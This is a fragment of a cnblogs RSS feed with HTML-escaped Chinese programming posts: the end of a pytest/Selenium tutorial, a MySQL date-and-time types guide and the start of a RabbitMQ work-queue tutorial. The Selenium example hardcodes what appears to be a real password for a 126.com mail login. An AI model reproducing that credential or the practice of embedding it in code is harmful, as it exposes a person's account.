&lt;/span&gt;&lt;span&gt;241&lt;/span&gt;         &lt;span&gt;assert&lt;/span&gt; value &lt;span&gt;in&lt;/span&gt; source, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;关键字&quot;{}&quot;不存在源码中!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(value)
&lt;/span&gt;&lt;span&gt;242&lt;/span&gt; 
&lt;span&gt;243&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; assertStringContainsValue(self, String, value):
&lt;/span&gt;&lt;span&gt;244&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;断言某段字符串包含另一个字符串&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;245&lt;/span&gt;         &lt;span&gt;print&lt;/span&gt;(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;info:assert &quot;{}&quot; contains &quot;{}&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(String, value))
&lt;/span&gt;&lt;span&gt;246&lt;/span&gt;         &lt;span&gt;assert&lt;/span&gt; value &lt;span&gt;in&lt;/span&gt; String, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;{}&quot;不包含&quot;{}&quot;!&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(String, value)
&lt;/span&gt;&lt;span&gt;247&lt;/span&gt; 
&lt;span&gt;248&lt;/span&gt; 
&lt;span&gt;249&lt;/span&gt; &lt;span&gt;    @staticmethod
&lt;/span&gt;&lt;span&gt;250&lt;/span&gt;     &lt;span&gt;def&lt;/span&gt;&lt;span&gt; getSheet(sheetName):
&lt;/span&gt;&lt;span&gt;251&lt;/span&gt;         &lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;&lt;span&gt;获取某个sheet页的对象&lt;/span&gt;&lt;span&gt;&quot;&quot;&quot;&lt;/span&gt;
&lt;span&gt;252&lt;/span&gt;         sheet =&lt;span&gt; BasePage.excel.getSheetByName(sheetName)
&lt;/span&gt;&lt;span&gt;253&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; sheet
&lt;/span&gt;&lt;span&gt;254&lt;/span&gt; 
&lt;span&gt;255&lt;/span&gt; 
&lt;span&gt;256&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; &lt;span&gt;__name__&lt;/span&gt; == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;__main__&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;:
&lt;/span&gt;&lt;span&gt;257&lt;/span&gt;     driver =&lt;span&gt; webdriver.Firefox()
&lt;/span&gt;&lt;span&gt;258&lt;/span&gt;     frame = (&lt;span&gt;'&lt;/span&gt;&lt;span&gt;xpath&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;//div[@id=&quot;loginDiv&quot;]/ifram&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;259&lt;/span&gt;     wait =&lt;span&gt; BasePage(driver)
&lt;/span&gt;&lt;span&gt;260&lt;/span&gt;     driver.get(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://mail.126.com/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;261&lt;/span&gt;     wait.switchToFrame(*&lt;span&gt;frame)
&lt;/span&gt;&lt;span&gt;262&lt;/span&gt;     username = wait.findElement(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;xpath&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;//input[@name=&quot;email&quot;]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;263&lt;/span&gt;     username.send_keys(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;账号&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;264&lt;/span&gt;     &lt;span&gt;if&lt;/span&gt; wait.isElementExsit(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;xpath&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;//input[@name=&quot;password&quot;]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;):
&lt;/span&gt;&lt;span&gt;265&lt;/span&gt;         wait.findElement(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;xpath&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;//input[@name=&quot;password&quot;]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;).send_keys(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;xiaochao11520&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;266&lt;/span&gt;     wait.click(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;xpath&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, &lt;span&gt;'&lt;/span&gt;&lt;span&gt;//a[@id=&quot;dologin&quot;]&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;)
&lt;/pre&gt;</description>
<pubDate>Tue, 30 Apr 2019 15:42:00 +0000</pubDate>
<dc:creator>linux超</dc:creator>
<og:description>前言 明天就放假了，4天小长假，是不是很开心！也许很多人要回老家帮家里种地，干农活。其实能陪陪家里人，帮忙干点农活还是挺开心的，希望大家有个愉快的假期！废话不多说哈，今天再来说说pytest吧，经过几</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/linuxchao/p/linuxchao-pytest-Actual.html</dc:identifier>
</item>
<item>
<title>MySQL 中的日期时间类型 - 刘哇勇</title>
<link>http://www.cnblogs.com/Wayou/p/mysql_data_type_datetime.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Wayou/p/mysql_data_type_datetime.html</guid>
<description>&lt;p&gt;日期时间类型中包含以下几种数据类型：&lt;/p&gt;
&lt;p&gt;各类型都有具体的取值范围，超出或非法的其他值时，MySQL 会回退到 0。TIMESTAMP 类型是个例外，给它设置一个超出范围的值时，将保存上该类型允许的最大值。&lt;/p&gt;
&lt;p&gt;MySQL 按标准格式 &lt;code&gt;YYYY-MM-DD hh:mm:ss[.fraction]&lt;/code&gt; 输出日期时间，但设置或进行日期时间相关的比较时却支持灵活的多种格式，会自动解析。具体支持的输入格式可参见 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-literals.html&quot; rel=&quot;nofollow&quot;&gt;Section 9.1.3, “Date and Time Literals”&lt;/a&gt;。其中 &lt;code&gt;fraction&lt;/code&gt; 部分为秒后面的小数部分，取值范围为 0~6 位。&lt;/p&gt;
&lt;p&gt;虽然 MySQL 支持多种格式进行日期时间的设置，但日期部分要求必须是 年-月-日 的形式才能正确解析。比如 &lt;code&gt;98-09-04&lt;/code&gt; 是按年月日顺序解析的，而不是英文里常用的月日年，或者日月年。&lt;/p&gt;
&lt;p&gt;年在只给了两位数的情况下，MySQL 尝试使用以下规则来补全：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;给定的两位数为 70~99 时解析成 1970 ~ 1999。&lt;/li&gt;
&lt;li&gt;给定为 00 ~ 69 时解析成 2000 ~ 2069。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;所以，为了避免不可预测的结果，使用时还是指定全一些。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;在需要使用数字的语境下，MySQL 会将日期时间自动转成数字。同理，在需要日期时间的相关操作语境下，会尝试将数字解析成日期时间。&lt;/li&gt;
&lt;li&gt;通过设置 MySQL 相关参数，日期类型可保存原本非法的值，比如开启 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/sql-mode.html#sqlmode_allow_invalid_dates&quot; rel=&quot;nofollow&quot;&gt;ALLOW_INVALID_DATES&lt;/a&gt; 设置项时，可设置日期类型保存一个 &lt;code&gt;2009-11-31&lt;/code&gt; 值，但正常情况下我们知道 11 月哪来什么 31 号。此时 MySQL 仅仅只是不检查月分与日期的关联性，但月分的取值范围 1&lt;del&gt;12 及日期的取值范围 1&lt;/del&gt;31 还是要单独各自做校验的。&lt;/li&gt;
&lt;/ul&gt;&lt;div class=&quot;highlight highlight-source-shell&quot; readability=&quot;17&quot;&gt;
&lt;pre&gt;
mysql&lt;span class=&quot;pl-k&quot;&gt;&amp;gt;&lt;/span&gt; INSERT INTO todo (title,created_on) VALUES (&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;blah&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;2019-09-31&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;)&lt;span class=&quot;pl-k&quot;&gt;;&lt;/span&gt;
ERROR 1292 (22007): Incorrect date value: &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;2019-09-31&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;for&lt;/span&gt; column &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;created_on&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt; at row 1

mysql&lt;span class=&quot;pl-k&quot;&gt;&amp;gt;&lt;/span&gt; SET SESSION sql_mode = &lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;ALLOW_INVALID_DATES&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;;&lt;/span&gt;
Query OK, 0 rows affected (0.00 sec)

mysql&lt;span class=&quot;pl-k&quot;&gt;&amp;gt;&lt;/span&gt; INSERT INTO todo (title,created_on) VALUES (&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;blah&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;2019-09-31&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;)&lt;span class=&quot;pl-k&quot;&gt;;&lt;/span&gt;
Query OK, 1 row affected, 1 warning (0.01 sec)
mysql&lt;span class=&quot;pl-k&quot;&gt;&amp;gt;&lt;/span&gt; SELECT &lt;span class=&quot;pl-k&quot;&gt;*&lt;/span&gt; FROM todo&lt;span class=&quot;pl-k&quot;&gt;;&lt;/span&gt;
+----+------+------------+
&lt;span class=&quot;pl-k&quot;&gt;|&lt;/span&gt; id &lt;span class=&quot;pl-k&quot;&gt;|&lt;/span&gt; title &lt;span class=&quot;pl-k&quot;&gt;|&lt;/span&gt; created_on    &lt;span class=&quot;pl-k&quot;&gt;|&lt;/span&gt;
+----+------+------------+
&lt;span class=&quot;pl-k&quot;&gt;|&lt;/span&gt;  1 &lt;span class=&quot;pl-k&quot;&gt;|&lt;/span&gt; blah &lt;span class=&quot;pl-k&quot;&gt;|&lt;/span&gt; 2019-09-31 &lt;span class=&quot;pl-k&quot;&gt;|&lt;/span&gt;
+----+------+------------+
1 rows &lt;span class=&quot;pl-k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;set&lt;/span&gt; (0.00 sec)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;某些场景下你可能需要保存部分日期，比如用户只输入了年没输入月日。所以 MySQL 是支持将月日设置成 0，比如 &lt;code&gt;2019-00-00&lt;/code&gt;。但这种情况下就无法从日期相关的操作中获得到准确的结果，比如使用 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_date-sub&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;DATE_SUB()&lt;/code&gt;&lt;/a&gt; 或 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_date-add&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;DATE_ADD()&lt;/code&gt;&lt;/a&gt; 函数时。禁用月日的零值可通过开启 MySQL 的 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/sql-mode.html#sqlmode_no_zero_in_date&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;NO_ZERO_IN_DATE&lt;/code&gt;&lt;/a&gt; 模式。&lt;/p&gt;
&lt;p&gt;除了月日可零，MySQL 还支持设置年月日都零的值 &lt;code&gt;0000-00-00&lt;/code&gt;，对于日期非必填的情况比较有用，因为此时它比单纯的 &lt;code&gt;NULL&lt;/code&gt; 更有语义。可通过开启 MySQL 的 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/sql-mode.html#sqlmode_no_zero_date&quot; rel=&quot;nofollow&quot;&gt;NO_ZERO_DATE&lt;/a&gt; 模式来禁用这个全零的值。&lt;/p&gt;
&lt;p&gt;各日期时间零值格式如下，但实际时用时，直接简写成一个 0 效果是等效的。&lt;/p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Data Type&lt;/th&gt;
&lt;th&gt;“Zero” Value&lt;/th&gt;
&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;DATE&lt;/td&gt;
&lt;td&gt;'0000-00-00'&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;TIME&lt;/td&gt;
&lt;td&gt;'00:00:00'&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;DATETIME&lt;/td&gt;
&lt;td&gt;'0000-00-00 00:00:00'&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;TIMESTAMP&lt;/td&gt;
&lt;td&gt;'0000-00-00 00:00:00'&lt;/td&gt;
&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;YEAR&lt;/td&gt;
&lt;td&gt;0000&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2&gt;DATE，DATETIME，及 TIMESTAMP&lt;/h2&gt;
&lt;p&gt;三者具有相关性，都支持多种格式的自动解析，详见 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-literals.html&quot; rel=&quot;nofollow&quot;&gt;Date and Time Literals&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DATE&lt;/code&gt; 日期格式不带时间 &lt;code&gt;TIME&lt;/code&gt; 部分，查询时输出格式为 &lt;code&gt;YYYY-MM-DD&lt;/code&gt;，取值范围为 &lt;code&gt;1000-01-01&lt;/code&gt; 到 &lt;code&gt;9999-12-31&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DATETIME&lt;/code&gt; 包含日期及时间，输出格式为 &lt;code&gt;YYYY-MM-DD hh:mm:ss&lt;/code&gt;，取值范围 &lt;code&gt;1000-01-01 00:00:00&lt;/code&gt; 到 &lt;code&gt;9999-12-31 23:59:59&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;TIMESTAMP&lt;/code&gt; 同 &lt;code&gt;DATETIME&lt;/code&gt;，但取值范围基于 UTC 时间，较 &lt;code&gt;DATETIME&lt;/code&gt; 要小，为 &lt;code&gt;1970-01-01 00:00:01&lt;/code&gt; UTC 到 &lt;code&gt;2038-01-19 03:14:07&lt;/code&gt; UTC。所以使用 TIMESTAMP 格式的时间，到 2038 年会溢出，这就是 &lt;a href=&quot;https://en.wikipedia.org/wiki/Year_2038_problem&quot; rel=&quot;nofollow&quot;&gt;Year 2038 problem&lt;/a&gt;。关于该问题的讨论和解决可参见这个 &lt;a href=&quot;https://stackoverflow.com/a/2012620/1553656&quot; rel=&quot;nofollow&quot;&gt;StackOverflow 的回答&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;既然如此，为何要使用这个取值范围更小的呢。&lt;code&gt;TIMESTAMP&lt;/code&gt; 存储的值是带时区的。在存储时会根据当前时区转成 UTC（universal time zone） 存储，查询时也会根据时区从 UTC 转换到具体的时间。对于支持多语及国际化全球部署的应用来说，显得尤为方便。需要注意的是，这里操作基于的时区默认为服务器的时区，可通过改变 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_time_zone&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;time_zone&lt;/code&gt;&lt;/a&gt; &lt;code&gt;SET GLOBAL time_zone=time_zone&lt;/code&gt; 来修改。时区的设置也可以是以连接为单位，这样来自不同时区的请求可得到不同的时间。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;TIMESTAMP&lt;/code&gt; 和 &lt;code&gt;DATETIME&lt;/code&gt; 都可包含至多 6 位的小数来表示时间中毫秒（microseconds）的部分。所以，带上毫秒时完整的格式是 &lt;code&gt;YYYY-MM-DD hh:mm:ss[.fraction]&lt;/code&gt;。前者取值范围为 &lt;code&gt;1970-01-01 00:00:01.000000&lt;/code&gt; 到 &lt;code&gt;2038-01-19 03:14:07.999999&lt;/code&gt;，后者为 &lt;code&gt;1000-01-01 00:00:00.000000&lt;/code&gt; 到 &lt;code&gt;9999-12-31 23:59:59.999999&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;在写入时，对于非法的日期时间值，将自动存成零值，即 '0000-00-00' 或 '0000-00-00 00:00:00'。&lt;/p&gt;
&lt;p&gt;关于日期时间需要注意的点：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;因为 MySQL 支持比较宽松的格式来设置日期时间，所以理论上你可以用你想用的值来做为数字之间的分界符，但使用时需要关注其解析的原理。比如给一个日期格式的列设置 &lt;code&gt;10:11:12&lt;/code&gt;，虽然这个值看起来像时间类型，但还是可以正确在被解析成目标列的格式，即日期。如果这这个日期列设置 &lt;code&gt;10:45:15&lt;/code&gt; 则会认为是非法值，因为 &lt;code&gt;45&lt;/code&gt; 不是一个合法的月份值，所以存储时变成零值 &lt;code&gt;0000-00-00&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;日期时间与毫秒的分界符必需是小数点。&lt;/li&gt;
&lt;li&gt;默认 MySQL 除了检查日月值是否有有效范围 1~ 31,1~12。还会将两者结合进来检查，比如 4 月没有 31。所以对于日期 &lt;code&gt;2004-04-31&lt;/code&gt; 算是非法的，会变成零值 &lt;code&gt;0000-00-00&lt;/code&gt;。如果不需要这样的约束检查，可开启 MySQL 的 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/sql-mode.html#sqlmode_allow_invalid_dates&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;ALLOW_INVALID_DATES&lt;/code&gt;&lt;/a&gt; 模式。&lt;/li&gt;
&lt;/ul&gt;&lt;h3&gt;日期时间的自动初始化及更新&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;TIMESTAMP&lt;/code&gt; 和 &lt;code&gt;DATETIME&lt;/code&gt; 还支持自动初始化（auto-initialized）和更新到当前时间（auto-updated）。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;创建表定义列时，指定 &lt;code&gt;DEFAULT CURRENT_TIMESTAMP&lt;/code&gt; 来使相应的日期时间列自动初始化。&lt;/li&gt;
&lt;li&gt;指定 &lt;code&gt;ON UPDATE CURRENT_TIMESTAMP&lt;/code&gt; 来使相应的日期时间列自动更新。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;两者可同时作用于一个日期时间列，表示插入记录时自动初始化成当前时间，后续记录更新时自动更新到当前时间。&lt;/p&gt;
&lt;p&gt;其中 &lt;code&gt;CURRENT_TIMESTAMP&lt;/code&gt; 指代当前时间，与其有相同效果的还有 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_current-timestamp&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;CURRENT_TIMESTAMP()&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_now&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;NOW()&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_localtime&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;LOCALTIME&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_localtime&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;LOCALTIME()&lt;/code&gt;&lt;/a&gt;, &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_localtimestamp&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;LOCALTIMESTAMP&lt;/code&gt;&lt;/a&gt; 以及 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_localtimestamp&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;LOCALTIMESTAMP()&lt;/code&gt;&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;DEFAULT&lt;/code&gt; 除了可指定成当前时间外，也可指定一个任意的固定值，比如 &lt;code&gt;DEFAULT 0&lt;/code&gt; 或 `DEFAULT '2000-01-01 00:00:00'。&lt;/p&gt;
&lt;p&gt;对于指定了自动初始化的列，插入时如果没指定该列的值，则会自动设置为当前的时间。&lt;/p&gt;
&lt;p&gt;对于指定为自动更新的列，一旦一条记录中有字段变更，该日期会自动更新成变更时的时间。如果不想它更新，可在插入其他值时手动设置一下该日期列为原有的值，让其保持不变。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;TIMESTAMP&lt;/code&gt; 和 &lt;code&gt;DATETIME&lt;/code&gt; 在列的定义时，如果指定了小数部分，那么在配合使用 &lt;code&gt;CURRENT_TIMESTAMP(fsp)&lt;/code&gt; 时，这个小数部分的精度需要保持一致。比如：&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-sql&quot; readability=&quot;9&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;--&lt;/span&gt; ✅&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;t1&lt;/span&gt; (
  ts &lt;span class=&quot;pl-k&quot;&gt;TIMESTAMP&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;6&lt;/span&gt;) DEFAULT &lt;span class=&quot;pl-c1&quot;&gt;CURRENT_TIMESTAMP&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;6&lt;/span&gt;) &lt;span class=&quot;pl-k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;UPDATE&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;CURRENT_TIMESTAMP&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;6&lt;/span&gt;)
);

&lt;span class=&quot;pl-c&quot;&gt;&lt;span class=&quot;pl-c&quot;&gt;--&lt;/span&gt; 🚨&lt;/span&gt;
&lt;span class=&quot;pl-k&quot;&gt;CREATE&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;TABLE&lt;/span&gt; &lt;span class=&quot;pl-en&quot;&gt;t1&lt;/span&gt; (
  ts &lt;span class=&quot;pl-k&quot;&gt;TIMESTAMP&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;6&lt;/span&gt;) DEFAULT &lt;span class=&quot;pl-c1&quot;&gt;CURRENT_TIMESTAMP&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;ON&lt;/span&gt; &lt;span class=&quot;pl-k&quot;&gt;UPDATE&lt;/span&gt; &lt;span class=&quot;pl-c1&quot;&gt;CURRENT_TIMESTAMP&lt;/span&gt;(&lt;span class=&quot;pl-c1&quot;&gt;3&lt;/span&gt;)
);
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;TIME&lt;/h2&gt;
&lt;p&gt;时间 &lt;code&gt;TIME&lt;/code&gt; 格式即日期时间中时间的部分，输出格式为 &lt;code&gt;hh:mm:ss&lt;/code&gt; 或时间较大时为 &lt;code&gt;hhh:mm:ss&lt;/code&gt;，取值范围 &lt;code&gt;-838:59:59&lt;/code&gt; 到 &lt;code&gt;838:59:59&lt;/code&gt;。同样地，也是支持带至多 6 位小数表示毫秒。&lt;/p&gt;
&lt;p&gt;设置时也是支持将多种格式自动解析。对于带冒号的情况，比如 &lt;code&gt;11:12&lt;/code&gt; 解析成 &lt;code&gt;11:12:00&lt;/code&gt; 而不是 &lt;code&gt;00:11:12&lt;/code&gt;。不带冒号的情况，将最右边的两位数字解析成秒（按逝去的时间来解析），比如 &lt;code&gt;'1112'&lt;/code&gt; 和 &lt;code&gt;1112&lt;/code&gt; 不是 &lt;code&gt;11:12:00&lt;/code&gt; 而会解析成 &lt;code&gt;00:11:12&lt;/code&gt;。同理，&lt;code&gt;'12'&lt;/code&gt; 和 &lt;code&gt;12&lt;/code&gt; 会解析成 &lt;code&gt;00:00:12&lt;/code&gt;。&lt;/p&gt;
&lt;h2&gt;YEAR&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;YEAR&lt;/code&gt; 表示日期中年的部分，是一个 1 字节大小的类型，可通过 &lt;code&gt;YEAR&lt;/code&gt; 或 &lt;code&gt;YEAR(4)&lt;/code&gt; 来声明，其展示宽度（display width）为 4。查询时输出格式为 &lt;code&gt;YYYY&lt;/code&gt;，取值范围 1901 到 2155。 &lt;code&gt;0000&lt;/code&gt; 也是合法的值。&lt;/p&gt;
&lt;p&gt;支持使用以下格式进行设置：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;使用 1901 ~ 2155 间的四位数字值。&lt;/li&gt;
&lt;li&gt;或将上面的数字以字符串形式给定。&lt;/li&gt;
&lt;li&gt;1 ~ 99 之间的数字，此时 1 ~ 69 解析成 2001 ~ 2069，70 ~ 99 解析成 1970 ~ 1999.&lt;/li&gt;
&lt;li&gt;其他可返回合法值的方法，比如 &lt;a href=&quot;https://dev.mysql.com/doc/refman/8.0/en/date-and-time-functions.html#function_now&quot; rel=&quot;nofollow&quot;&gt;&lt;code&gt;NOW()&lt;/code&gt;&lt;/a&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;h2&gt;相关资源&lt;/h2&gt;
</description>
<pubDate>Tue, 30 Apr 2019 15:40:00 +0000</pubDate>
<dc:creator>刘哇勇</dc:creator>
<og:description>日期时间类型中包含以下几种数据类型： DATE TIME DATETIME TIMESTAMP YEAR 各类型都有具体的取值范围，超出或非法的其他值时，MySQL 会回退到 0。TIMESTAMP</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Wayou/p/mysql_data_type_datetime.html</dc:identifier>
</item>
<item>
<title>RabbitMQ指南之二：工作队列（Work Queues） - 无恨之都</title>
<link>http://www.cnblogs.com/wuhenzhidu/p/10787702.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wuhenzhidu/p/10787702.html</guid>
<description>&lt;p&gt;  　　在上一章的指南中，我们写了一个命名队列：生产者往该命名队列发送消息、消费从从该命名队列中消费消息。在本章中，我们将创建一个工作队列，用于在多个工作者之间分配耗时的任务。工作队列(即任务队列)的主要思想是避免立即执行那些需要等他们执行完成的资源密集型任务。相反，我们将任务安排在稍后完成。我们将任务封装为消息并将其发送到队列，后台运行的工作进程将取出任务并执行完成。如果你启动了多个工作者，这些任务将在多个工作者之间分享。&lt;/p&gt;
&lt;p&gt;　　这个概念也即我们说的异步，在项目中，有时候一个简单的Web请求，后台要做一系统的操作，这时候，如果后台执行完成之后再给前台返回消息将会导致浏览器页面等待从而出现假死状态。因此，通常的做法是，在这个Http请求到后台，后台获取到正确的参数等信息后立即给前台返回一个成功标志，然后后台异步地进行后续的操作。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1651332/201904/1651332-20190428220258839-1855423161.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　本章中，我们将发送字符串消息来模拟复杂的任务。这里因为没有一个真实的复杂任务，因此用Thread.sleep()方法来模拟复杂耗时的任务。我们用字符串中的含点（“.&quot;）的数量来表示任务的复杂程度，一个点表示一秒钟的耗时，例如：一个发送”Hello ...“字符串的任务将会耗时3秒钟。&lt;/p&gt;
&lt;p&gt;　　我们可以直接将上一章中的&lt;em&gt;&lt;span&gt;Send.java&lt;/span&gt;&lt;/em&gt;代码拿过来修改，允许从命令行发送消息。本程序将会把任务调试到工作队列，因此，我们将类名改为NewTask.java：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
String message = String.join(&quot; &quot;&lt;span&gt;, argv);

channel.basicPublish(&lt;/span&gt;&quot;&quot;, &quot;hello&quot;, &lt;span&gt;null&lt;/span&gt;&lt;span&gt;, message.getBytes());
